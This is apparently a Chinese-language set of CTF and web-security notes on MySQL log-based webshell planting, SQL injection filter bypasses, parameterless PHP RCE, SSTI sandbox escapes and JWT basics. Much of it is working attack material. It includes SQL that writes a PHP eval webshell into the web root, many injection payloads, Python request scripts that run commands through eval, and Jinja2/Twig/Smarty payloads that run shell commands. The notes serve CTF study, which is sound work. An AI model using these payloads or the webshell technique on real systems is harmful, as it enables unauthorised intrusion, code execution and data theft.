    # 查看日志输出类型 table：将日志存入数据库的日志表中；file：将日志存入文件中
    show variables like 'log_output';

    # 修改日志存储类型
    set global log_output='table/file';

    ```

    >getshell方式

    ```sql

    set global general_log=on;
    set global general_log_file='/var/www/html/shell.php';
    select '<?php eval($_POST[8]);?>'
    ```

* 慢日志getshell

    >一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。查看服务器默认时间值方式

    ```sql

    # 查看服务器默认时间值方式
    show global variables like '%long_query_time%'
    show global variables like '%long%'

    # 查看慢日志参数
    show global variable like '%slow%';
    ```

    >getshell方式

    ```sql

    # 打开慢日志
    set global slow_query_log=on

    # 设置慢日志路径
    set global slow_query_log_file='/var/www/html/shell.php'

    # 记录到日志中的语句
    select '<?php @eval($_POST[8]);?>' or sleep(20)
    ```

## 爆绝对路径

* 单引号报错

    直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。 
    `www.xxx.com/news.php?id=1'`

* 错误参数

    将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。 
    `www.xxx.com/researcharchive.php?id=-1`

* 配置文件找路径

    如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。
    ```php
    Windows:
    c:\windows\php.ini php配置文件
    c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件


    Linux:
    /etc/php.ini php配置文件
    /etc/httpd/conf.d/php.conf
    /etc/httpd/conf/httpd.conf Apache配置文件
    /usr/local/apache/conf/httpd.conf
    /usr/local/apache2/conf/httpd.conf
    /usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件
    ```

* google语法

    结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。
    `Site:xxx.edu.tw warning`
    `Site:xxx.com.tw “fatal error”`

* 测试文件

    很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。
    ```php
    www.xxx.com/test.php
    www.xxx.com/ceshi.php
    www.xxx.com/info.php
    www.xxx.com/phpinfo.php
    www.xxx.com/php_info.php
    www.xxx.com/1.php
    ```

* phpmyadmin爆路径

    一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。
    ```php
    
    /phpmyadmin/libraries/lect_lang.lib.php
    /phpMyAdmin/index.php?lang[]=1
    /phpMyAdmin/phpinfo.php
    load_file()
    /phpmyadmin/themes/darkblue_orange/layout.inc.php
    /phpmyadmin/libraries/select_lang.lib.php
    /phpmyadmin/libraries/lect_lang.lib.php
    /phpmyadmin/libraries/mcrypt.lib.php
    ```

## 概述Mysql信息
>ctfshow 235 236
>[概述MySQL信息](https://www.jb51.net/article/134678.htm)

* 查询位置1`mysql.innodb`

    持久化统计信息保存在表`mysql.innodb_table_stats`和`mysql.innodb_index_stats`

    ![网页截图](./CTF/indb.jpg)

    payload:`username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())-- - &password=\`

    `username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)-- - &password=\`

    `username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a)-- - &password=\`


* 查询位置2`sys schema`

    其中

    * `sys.schema_auto_increment_columns`
        
        可以实现对表自增ID的监控，也可以发现我们可以通过该视图获取数据库的表名信息

        payload:`-1' union all select 1,2,group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()--+`

    * `sys.schema_table_statistics_with_buffer`

        上一个试图总并没有出现的表名在这里出现

        payload:`?id=-1' union all select 1,2,group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()--+`

    * `processlist`

        该表可以读取正在执行的`sql`语句，从而得到表名和列名

## 常用函数

* `locate(substr,string)`
>ctfshow 194

    返回字符串string第一次出现子字符串的位置

* `chr()`

    将字符转为16进制

* `ascii()`

    转换为字符对应的ascii值，`ord()`

* `replace()`

    替换内容，可以用来绕过对结果显示的过滤

* `load_file()`
//ctfshow 189
>https://www.cnblogs.com/blacksunny/p/8060028.html
    知道系统绝对路径且具有读取权限

* `substr(xxx,0,1)`

    截取字符串

## 绕过过滤

* 注释符过滤

    在语句最后跟上or然后闭合原来的语句，在最后构成一个永假，使后面的部分根本没有用

    `?id=0)uniounionn/**/select/**/1,load_file("/tmp/360/key"),1,4/**/or(1`

    ```sql

    select * from article where id = (0)union/**/select/**/1,load_file("/tmp/360/key"),1,4/**/or(1)

    ```

* 如果`select 1,2,3`处逗号被过滤

    用`join`代替

    `-1 union select 1,2,3`
    `-1 union select * from (select 1)a join (select 2)b join (select 3)c%23`

* 如果`limit`处逗号被过滤

    使用`limit 1 offset 0`代替

    `limit 2,1`
    `limit 1 offset 2`

* 如果`substr\left\mid`中的逗号被过滤

    使用`from xxx for xxx`代替
    
    原来:`substr({payload},1,1)`
    现在:`substr({payload} from 1 for 2)`

    ![](./CTF/fromfor.jpg)
    
* `or`或者`information`被过滤

    参见*概述Mysql信息*模块使用的两个数据库(mysql>5.7)，sys schema和innodb schema两个数据库

    除此之外，系统表sys.schema_table_statistics_with_buffer、sys.schema_auto_increment_columns用于记录查询的缓存，某些情况下可代替information_schema

* `=`和`like`被过滤

    用正则匹配方法`regexp()`绕过

    ```sql

    select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&(column_name)regexp('^r'))
    ```

    这个查询语句使用了 information_schema.columns 表来获取表 users 的所有列名，并使用 group_concat 函数将列名以逗号隔开组成一个字符串返回。同时，查询条件中的 regexp('^r') 则是使用正则表达式匹配以字母 r 开头的列名。


* `if`被过滤

    用`case when`代替

    payload:`id=1^case%0aascii(substr(database(),1,1))when(102)then 2 else 3 end`

* `limit`被过滤

    `select user from users limit 1`

    加限制条件，如：

    `select user from users group by user_id having user_id = 1 (user_id是表中的一个column)`

    或者使用 `not in`

    ```sql

    uname=admin&passwd=admin' and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users' and column_name not in('user_id','user','first_name','last_name','avatar','last_login','failed_login')),'~'),1)
    ```

* 反斜杠绕过单引号过滤

    >ctfshow 235
    
    前提是两个参数可控
    `$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";`

    可以传password为`1\`，这样pass的单引号就被转义导致将原先后面的语句包括，变为`pass='1\'where username ='`，然后就在username进行注入，需要重新加一个username=,因为原先的变成password的一部分了

    payload:`# username=,username=(select group_concat(table_name) from information_schema.columns where table_schema=database())-- - &password=\`

* 正则没加`/i`修饰符

    尝试大小混写绕过

* 过滤去除匹配项

    尝试双写绕过

* 空格过滤

    * `()`代替

        考虑用报错注入，可以不用空格，`select`的内容可以用括号`()`括住，eg:`select(database())`

    * `/**/`代替 

    * `/*!...*/`内联注释代替

        在mysql中 `/*! ....*/` 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在`/*!....*/`中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行

    * `%0a\%0b\%0c...`

    * `%0a`

        `%a0`等于`空格`

        表示不间断空格，通常情况下，文字处理软件和HTML渲染引擎在给英文句子换行的时候，会在最近的空格($20)或者连接符($2D)处换行，但如果希望某两个单词始终显示在一行，即使在接近页面边缘时也不被拆分到两行，可以在它们中间用Non-breaking space，也就是“ ”($A0)。

    * `反引号`

        ```sql

        select`column_name`from`information_schema`.`columns`where`table_name`=0x7573657273;
        ```

* 敏感字符过滤

    url编码绕过（数据传入服务端都会做一次URL解码，URL解码对正常字符无影响，所以平时无影响，但是可以用来绕过）
    
    *十六进制转换绕过*
    
    ascii编码绕过

        `Test=char(101)+char(97)+char(115)+char(116)`
        
* 等价符号替代

    `=`-->`like`
    `^`-->`or`-->`||`(`||`在MySQL中可以起到拼接的作用)
    `&&`-->`and`


## 小技巧

* `group by + with rollup`

    >知识盒子骚操作总结
    
    `group by`将结果集中的数据行根据选择列的值进行逻辑分组
    `with rollup`(group by 后可以跟with rollup,表示在进行分组统计的基础上再次进行汇总统计)

* `where`的替代

    与where具有相同作用的还有`on`、`like`

* `快速判断注入类型`

    使用 2+2 如果正常查询4内容，就是数字，反之字符

* `select to_base64(xxx)`
    
    将查询内容转换为base64进行输出

* `select hex(xxx)`

    将查询内容转换为十六进制输出

* `十六进制`

    数据库中十六进制也可以用来当作键值

* `^`

    数据库中可以在查询值中用异或运算符

* `or`

    `$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";`

    可以使用`0'or(id=26)and'a'='a`进行绕过，用或条件，用于空格所有被过滤，无法创造一个完整的新语句，就得利用之前给到的语句。

* `where xxxx=0`查询所有数据

    select * from test where username =0 可以查出表中所有的记录，因为在username和0比较的时候进行弱比较，字符串转为0，这样一来就构成了0=0，所以查询成功

* `regexp`

    mysql可以使用正则表达式对结果进行过滤

* 显示长度不够

    截取
    `left(,30)` 
    `right(,30)` 
    `mid(x,0,2)`
    `substr(x,0,0)`

    显示部分
    (select(x)where(flag)regexp('^flag'))

    反转显示

    `sjm"||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1)#`


# 无参数RCE
>[什么是无参数RCE](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE)

## 前言
总体利用思路:
* 超全局变量进行bypass，进行RCE
* 进行任意文件读取

## 概念
通常情况下我们都是利用一句话木马传参数进行`getshell`，`eval(system('ls /'));`

但是如果对`GET`参数进行正则校验就会将输入的参数过滤掉

`/[^\W]+\((?R)?\)/`只允许执行`a(b(c()));或者a();`,但是不允许`a('123')`,没有参数进行命令执行就会变得困难。

* 超全局变量

    PHP中许多预定义变量都是"超全局的"，这意味着他们在一个脚本的全部作用域中都可用，在函数或者方法中无需执行`flobal $variable;`就可以访问他它们。

## 使用
### getenv办法
* `getenv()`

    获取一个环境变量的值，可以获取当前环境变量

* `array_rand()`

    从数组中随机抽取一个或者多个单元(伪随机)，这样获取的是数组中的`键`

* `array_flip()`

    交换数组中的键和值

* `组合利用`

    `?exp=show_source(array_rand(array_flip(scandir(current(localeconv())))));`

### getallheaders()

* getallheaders()

    在`apache2`环境中
    可以将获取`http头`中的所有信息，而在http请求头中我们可以`自定义属性和其值`，就像添加XFF那样，添加`sky:system('ls /tmp')`进行RCE

### get_defined_vars()

>使用getallheaders()其实具有局限性，因为它是apache2函数，如果目标中间件部位apache，那么这种方法就会失效，更好的选择是ger_defined_vars()

这种方法可以将变量进行回显，包括全局变量`$_GET,$_POST,$_FILES,$_COOKIE`

`%url%/index.php?code=var_dump(current(get_defined_vars()));&sky=123`这样就会把sky参数回显出来，利用这一特性，我们可以给参数赋恶意值，然后使用此函数对相应参数进行打印执行。

`current() 返回数组中的当前单元, 默认取第一个值。`

为了绕过get,post,cookie三种参数的多重过滤，可以从files参数下手，前辈写的脚本如下

```php
import requests
from io import BytesIO

payload = "system('ls /tmp');".encode('hex')
files = {
  payload: BytesIO('sky cool!')
}

r = requests.post('http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False)

print r.content
```

### session_id()

该函数可以获取/设置当前会话id。PHPSESSID允许字母和数字出现。

* `hex2bin`

    将十六进制转换为ASCII字符
    ```php
    echo hex2bin("48656c6c6f20576f726c6421");
    Hello World!

    ⬇ 5044383959474e6864434171594473  
    ⬇ PD89YGNhdCAqYDs
    <?=`cat *`;
    ```

* `session_start()`

    `?exp=show_source(session_id(session_start()));`
    `PHPSESSID=flag.php`

```php
mport requests
url = 'http://localhost/?code=eval(hex2bin(session_id(session_start())));'
payload = "echo 'sky cool';".encode('hex')
cookies = {
	'PHPSESSID':payload
}
r = requests.get(url=url,cookies=cookies)
print r.content

```

### dirname()&chdir()

如果不能`RCE`便尝试能不能直接读取文件，要进行目录遍历

* `getcwd()`

    用于获取当前目录
    ```php
    ?code=var_dump(getcwd());
    string(13) "/var/www/html"
    ```

* `scandir()`

    这个函数其实在`sql注入`中也用过

    ```php
    ?code=var_dump(scandir(getcwd()));

    array(3) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" }
    ```

* `dirname()`

    返回路径中的目录部分，也就是说将路径中的最后一部分去掉
    目录回溯，上级目录
    `?code=var_dump(scandir(dirname(getcwd())));`

* `chdir()`

    更改当前目录为指定路径

    `chdir(string $directory):bool`

    `chdir(dirname(getcwd()))`这样就可以切换当前目录到上级目录

* `localeconv()`

    返回一包含本地数字及货币格式信息的数组，数组第一项是`.`，可以代表当前目录的意思

* `current()`

    返回数组中的当前单元，默认取第一个值，这个函数和上一个函数一结合，返回的就是`.`

    这个函数的别名是`pos()`

* `next()`

    将数组内部指针指向前移动一位

* `end()`

    将数组内部指针指向最后一个单元

* `each()`

    返回数组中当前的键/值对，并将数组指针向前移动一位

* `prev()`

    将数组的内部指针倒回一位

* `reset()`    

    将数组的内部指针指向第一个单元

* `session_start()`

    session_start()告诉PHP使用session,php默认不主动使用session

* `shell_exec()`

    缩写就是(``)反引号,其中的内容可以被执行，适用于
    ```php
    eval(substr($F,0,6));
    传参$F=`$F`;+curl xxxxx
    能绕过字符串截取

    ```

# PHPINFO()关注点

* auto_append_file

    自动包含文件

# JAVA

## Javan基础

### servlet

    Servlet是在 Java Web容器中运行的小程序,通常我们用Servlet来处理一些较为复杂的服务器端的业务逻辑。Servlet是Java EE的核心,也是所有的MVC框架的实现的根本！

## Struts 2

* 概念

    Struts是一个基于MVC设计模式的Web应用框架，它本质上相当于一个`servlet`,在MVC设计模式中，Struts2作为控制器来建立模型与视图的数据交互。Struts2是Struts的下一代产品，是在Struts1和WebWork的技术基础上进行了合并都得1全新Struts2框架，其全新的Struts2的体系结构与Struts1的体系结构差别巨大。Struts2以WebWork位核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts2可以理解位WebWork都得更新产品。

### S2-001


# Nodejs

>https://xz.aliyun.com/t/9167#toc-0

## 原型链污染


## 特性

* 大小写转换

    羽师傅还有说了一些拓展：
    在`Character.toUpperCase()`函数中，字符ı会转变为I，字符ſ会变为S。
    在`Character.toLowerCase()`函数中，字符İ会转变为i，字符K会转变为k。

# SSTI模板注入

>总结主要来自以下两篇文章

>[SSTI-服务端模板注入漏洞](https://www.cnblogs.com/micr067/p/13258791.html)

>[flask之ssti模板注入从零到入门](https://xz.aliyun.com/t/3679/)


* 思路图

```php
上正下负
                          |--Smarty
        |-a{*comment*}b --|                     |--Mako
        |                 |--${"z".join("ab")}--|
${7*7}--|                                       |--Unknow
        |
        |                                       |--Jinja2
        |                 |-------{{7*'7'}}-----|--Twig
        |-----{{7*7}}-----|                     |--Unknown
                          |--Not vulnerable

```

## 基本概念

* 原理

    服务端模板注入是由于服务端接收了用户的输入，将其作为Web应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而导致了敏感信息泄露、代码执行、GetShell等问题。

    其影响范围主要取决于模板引擎的复杂性。


* 模板引擎

    >https://xz.aliyun.com/t/3679/
    模板引擎可以让(网站)程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好地设计也使得*代码重用*变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过

    模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于`从数据(变量)到实际的视觉表现(HTML代码)`这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用

    通俗点理解，拿到数据之后，塞进模板里，然后让渲染引擎将塞进去的东西生成html的文本，返回给浏览器，这样做的好处是展示数据快，大大提升效率

* 后端渲染

    浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTM字符串，计算就是服务器后端经过解析服务端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成

* 前端渲染

    前端渲染是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力比较小，主要渲染在用户的客户端完成。

* route装饰器路由

    `@app.route('/')`

    使用route()装饰器告诉Flask什么样的URL能触发我们的函数.route()装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如

    ```python

    @app.route('/')
    def test():
        return 123
    #访问根目录就会输出123
    ```

* *模板渲染*

    你可以使用`render_template()`方法渲染模板。你需要做的一切就是将模板名和你像作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例:

    ```python

    from flask import render_template

    @app.route('/hello/')
    @app.route('/hello/<name>')
    def hello(name=None):
            return render_template('hello.html', name=name)
    ```

* 逃逸

    在python中，object类是python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。

    ```python

    print("".__class__)
    #返回<class 'str'>,对于一个空字符串他已经打印了str类型，在python中，每个类都有一个bases属性，列出其基类。

    print("".__class__.__base__)
    #返回<class 'object'>，我们已经找到了他的基类object，而我们想寻找object类的不仅仅只有bases，同样可以使用mro

    print("".__class__.__mro__)
    #返回(<class 'str'>, <class 'object'>)，同样可以找到object类，正是由于这些但不仅限于这些放啊，我们才有了各种沙箱逃逸的姿势。正如上面的解释，mro返回了解析方法调用的顺序，将会打印两个。在flask ssti中poc很大一部分是从object类中寻找我们可利用的类的方法。我们这里只具里最简单的。接下来增加代码，使用subclasses()这个方法，这个方法返回的时这个类的字类的集合，也就是object类的字类的集合

    print("".__class__.base__[0].subclasses())
    #python 3.6 版本下的object类下的方法集合。这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。需要自己寻找合适的标号来调用接下来我将进一步解释。

    ```
    打印如下：
    ```python
    [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class 'moduledef'>, <class 'module'>, <class 'BaseException'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib._installed_safely'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'nt.ScandirIterator'>, <class 'nt.DirEntry'>, <class 'PyHKEY'>, <class 'zipimport.zipimporter'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_itemiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'MultibyteCodec'>, <class 'MultibyteIncrementalEncoder'>, <class 'MultibyteIncrementalDecoder'>, <class 'MultibyteStreamReader'>, <class 'MultibyteStreamWriter'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class 'collections._Link'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'functools.partialmethod'>, <class 'enum.auto'>, <enum 'Enum'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_sre.SRE_Pattern'>, <class '_sre.SRE_Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.Pattern'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'tokenize.Untokenizer'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class '_winapi.Overlapped'>, <class 'subprocess.STARTUPINFO'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]

    ```

    ```python

    #接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。举例一种

    <class 'os._wrap_close'>

    #os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到时第119个类，0也对应一个类，所以这里写[118]

    http://127.0.0.1:5000/test?{{"".__class__.__bases__[0].__subclasses__()[118]}}
    #会显示http://127.0.0.1:5000/test?<class 'os._wrap_close'>也就是我们要找的类

    这个时候我们便可以利用.init.globals来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数

    http://127.0.0.1:5000/test?{{"".__class__.base[0].subclasses()[118].__init__.__globals__}}

    #此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。

    http://127.0.0.1:5000/test?{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}

    #此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功取得到权限。
    
    ```

## ctf中的一些绕过tips

* 过滤[]等括号

    使用gititem绕过。

    原poc:`{{"".class.base[0]}}`
    绕过后:`{{"".class.bases.getitem(0)}}`

* 过滤了subclasses，拼凑法

    原poc:`{{"".class.bases[0].subclasses()}}`
    绕过后:`{{"".class.bases[0]'subcla'+'sses'}}`

* 过滤了class

    使用session

    绕过后:poc `{{session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}`

    多个bases[0]是因为一直在向上找object类。使用mro就会很方便

    `{{session['__cla'+'ss__'].__mro__[12]}}`
    或者

    `request['__cl'+'ass__'].__mro__[12]}}`

* timeit

    可以学习一下 2017 swpu-ctf的一道沙盒python题，

    >这里不详说了，博大精深，我只意会一二。

    ```python
    
    import timeit
    timeit.timeit("__import__('os').system('dir')",number=1)

    import platform
    print platform.popen('dir').read()
    ```

* 原博主收藏的poc

    ```python

    ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )

    object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')

    {{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}

    ```

    ```python

    读目录、文件
    {{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}

    //拼接global
    {{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")}}

    {{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').listdir('/')")}}
    {{[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].__dict__['system']('ls')}}
    {{[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)}}
    {{[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.open('xxx','r').read()}}
    页面没有回显时
    #命令执行： 
    {% for c in [].__class__.__base__.__subclasses__() %} 
    #先通过for循环根据模块名寻找符合要求的模块
    {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}

    #如果找到该模块就进行后续的函数操作
    {% endif %}{% endfor %} 
    # 结束判断结束循环
    #文件操作    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}
    {% endif %}{% endfor %}


    ```

* 脚本

    ```python

    ?name={% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{% print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %}
    ```

    ```python
    #查询需要的类在第几位
    #输入查询出来类的列表和需要借助的类名称
    def find():
    list = ""
    list = list.replace('\'','')
    list = list.replace('<','')
    list = list.replace('>','')
    list = list.replace('class ','')
    list = list.replace('enum ','')
    list = list.replace('type ','')
    list = list.split(',')

    print(list)
    className = ' warnings.catch_warnings'
    num = list.index(className)
    print(num)



    if __name__ == '__main__':
        find()


    ```

## 思路图

![](https://gitee.com/i404notforget/sprint/raw/master/img/20210611200627.png)

## Flask(Jinja2)服务端模板注入

* 



## 常用payload

* Twig(PHP模板语言)

    `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

* smarty

    在相应注入点`{{system('cat /flag')}}`


# JWT(JSON Web Token)

>[在线jwt](https://jwt.io/)

>[密钥爆破c-hwt-cracker](https://github.com/brendan-rius/c-jwt-cracker.git)

>[JSON Web Token攻击技巧](https://xz.aliyun.com/t/2338)

>[天融信-检测与防护能力-浅析JWT攻击类型](https://www.topsec.com.cn/newsx/3727)

## cookie、session、token

>[cookie,session和token的总结](https://www.freebuf.com/articles/web/336113.html)

* cookie+session

    用户登录，输入账号密码
    服务器验证账号密码是否正确，创建会话，然后把会话数据存储在数据库中，并将sessionID保存在cookie中返回到浏览器

    具有sessionID的cookie保存在用户浏览器

    接下来请求中，浏览器携带cookie一并发给服务器，服务器会genuine数据库验证sessionID，通过验证就会继续处理

    一旦用户登出，服务端和客户端同时销毁该会话

* token+session(用签名的方式)

    用户输入登录信息
    服务器判断登录信息是否真确，返回一个token(一般是JWT)
    token存储在客户端，保存在local storage（一般保存这里）， session storage 或者 cookie 。
    接着发起请求的时候将token放进url参数或者http header(Authorization header)

    服务器端用私钥对数据进行加密得到的签名，跟token里面的签名进行比较，如果签名一样且时间有效，则处理该请求。

    一旦用户登出，token在客户端被销毁，没有服务器端(因为服务器端用的是私钥加密验证，有私钥就行)

* token

    session下服务器端需要保存所有用户的session ID，如果访问用户变多就会给服务端带来很大的负担，并且，服务端是由`多台服务器`组成的一个`集群`，用户通过服务器A登录系统，那么sessionID就会保存在A上，如果用户下一次请求被转发到服务器B，服务器B没有存储用户的SessionID

    服务端对用户数据做的签名(sign)是通过私钥来加密的

* 如何判断token是否是伪造

